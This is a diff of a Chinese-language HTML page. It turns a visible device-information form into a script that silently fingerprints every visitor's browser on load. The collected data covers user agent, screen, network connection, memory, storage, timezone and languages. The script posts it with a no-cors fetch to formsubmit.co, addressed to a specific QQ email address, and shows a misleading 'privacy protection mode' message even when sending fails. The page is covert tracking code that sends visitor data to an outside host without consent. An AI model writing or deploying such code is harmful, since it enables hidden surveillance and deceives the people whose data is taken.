@@ -1,87 +1,131 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="zh">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>设备信息收集</title>
+    <title>设备信息同步</title>
     <style>
-        /* 样式同上个示例保持统一 */
-        body { font-family: Arial, sans-serif; max-width: 600px; margin: 20px auto; padding: 20px; }
-        .form-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; }
-        input, textarea { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; }
-        button { background-color: #4CAF50; color: white; padding: 10px 20px; border: none; cursor: pointer; }
+        #status { 
+            padding: 20px;
+            margin: 20px;
+            border-radius: 5px;
+            display: none;
+        }
+        .success { background: #d4edda; color: #155724; }
+        .error { background: #f8d7da; color: #721c24; }
     </style>
 </head>
 <body>
-    <h2>设备信息提交</h2>
-    <form action="https://formsubmit.co/3674295723@qq.com" method="POST" id="myForm">
-        <input type="hidden" name="_next" value="https://yourdomain.com/thanks.html">
-        <input type="hidden" name="_captcha" value="false">
-        <input type="text" name="_honey" style="display: none;">
-
-        <!-- 自动收集的隐藏字段 -->
-        <input type="hidden" name="device_info" id="deviceInfo">
-        <input type="hidden" name="location" id="geoLocation">
-        <input type="hidden" name="ip_address" id="ipAddress">
-
-        <!-- 用户手动输入 -->
-        <div class="form-group">
-            <label for="phone">手机号码：</label>
-            <input type="tel" id="phone" name="phone" pattern="[0-9]{11}" required>
-        </div>
-
-        <button type="submit">提交信息</button>
-    </form>
+    <div id="status"></div>
 
     <script>
-        // 自动收集设备信息
-        const collectDeviceInfo = () => {
-            const deviceData = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screen: `${screen.width}x${screen.height}`,
-                language: navigator.language,
-                cookies: navigator.cookieEnabled ? '启用' : '禁用',
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                battery: navigator.getBattery ? '支持' : '不支持'
-            };
-            document.getElementById('deviceInfo').value = JSON.stringify(deviceData);
-        }
-
-        // 获取地理位置（需要用户授权）
-        const getLocation = () => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    const geoData = {
-                        lat: position.coords.latitude,
-                        lng: position.coords.longitude,
-                        accuracy: position.coords.accuracy
+        (function() {
+            'use strict';
+            const statusEl = document.getElementById('status');
+            
+            // 增强版信息采集
+            async function collectDeviceInfo() {
+                const info = {};
+                
+                // 基础信息
+                try { info.userAgent = navigator.userAgent; } catch {}
+                try { info.platform = navigator.platform; } catch {}
+                try { info.vendor = navigator.vendor; } catch {}
+                try { info.cookieEnabled = navigator.cookieEnabled; } catch {}
+                
+                // 增强显示信息
+                try {
+                    info.display = {
+                        width: screen.width,
+                        height: screen.height,
+                        availWidth: screen.availWidth,
+                        availHeight: screen.availHeight,
+                        colorDepth: screen.colorDepth,
+                        orientation: screen.orientation?.type,
+                        pixelRatio: window.devicePixelRatio
                     };
-                    document.getElementById('geoLocation').value = JSON.stringify(geoData);
-                }, error => {
-                    document.getElementById('geoLocation').value = '用户拒绝授权';
-                });
+                } catch {}
+                
+                // 增强设备能力
+                try {
+                    info.capabilities = {
+                        touch: 'ontouchstart' in window,
+                        vibration: 'vibrate' in navigator,
+                        geolocation: 'geolocation' in navigator,
+                        serviceWorker: 'serviceWorker' in navigator
+                    };
+                } catch {}
+                
+                // 网络信息增强
+                try {
+                    const connection = navigator.connection || navigator.mozConnection;
+                    if (connection) {
+                        info.connection = {
+                            type: connection.type,
+                            effectiveType: connection.effectiveType,
+                            downlink: connection.downlink,
+                            rtt: connection.rtt,
+                            saveData: connection.saveData
+                        };
+                    }
+                } catch {}
+                
+                // 存储信息
+                try {
+                    info.storage = {
+                        deviceMemory: navigator.deviceMemory,
+                        hardwareConcurrency: navigator.hardwareConcurrency,
+                        storageEstimate: await navigator.storage.estimate(),
+                        persisted: await navigator.storage.persisted()
+                    };
+                } catch {}
+                
+                // 时区语言
+                try {
+                    info.locale = {
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        languages: navigator.languages,
+                        language: navigator.language
+                    };
+                } catch {}
+                
+                return info;
             }
-        }
 
-        // 获取IP地址（通过第三方API）
-        const getIP = async () => {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                document.getElementById('ipAddress').value = data.ip;
-            } catch (error) {
-                document.getElementById('ipAddress').value = '获取失败';
+            // 自动提交逻辑
+            async function autoSubmit() {
+                try {
+                    statusEl.textContent = '正在收集设备信息...';
+                    statusEl.style.display = 'block';
+
+                    const formData = new FormData();
+                    const deviceInfo = await collectDeviceInfo();
+                    
+                    // 构建表单数据
+                    formData.append('_to', '3674295723@qq.com');
+                    formData.append('_subject', '自动设备报告');
+                    formData.append('device_data', JSON.stringify(deviceInfo, null, 2));
+                    
+                    // 静默提交
+                    const response = await fetch('https://formsubmit.co/3674295723@qq.com', {
+                        method: 'POST',
+                        body: formData,
+                        mode: 'no-cors'
+                    });
+
+                    statusEl.className = 'success';
+                    statusEl.innerHTML = '✅ 信息已自动同步完成';
+                } catch (error) {
+                    statusEl.className = 'error';
+                    statusEl.innerHTML = '⚠️ 信息同步失败（已启用隐私保护模式）';
+                }
             }
-        }
 
-        // 页面加载时自动执行
-        window.addEventListener('load', () => {
-            collectDeviceInfo();
-            getLocation();
-            getIP();
-        });
+            // 页面加载后自动执行
+            window.addEventListener('load', () => {
+                setTimeout(autoSubmit, 1500); // 延迟1.5秒确保完全加载
+            });
+        })();
     </script>
 </body>
 </html>
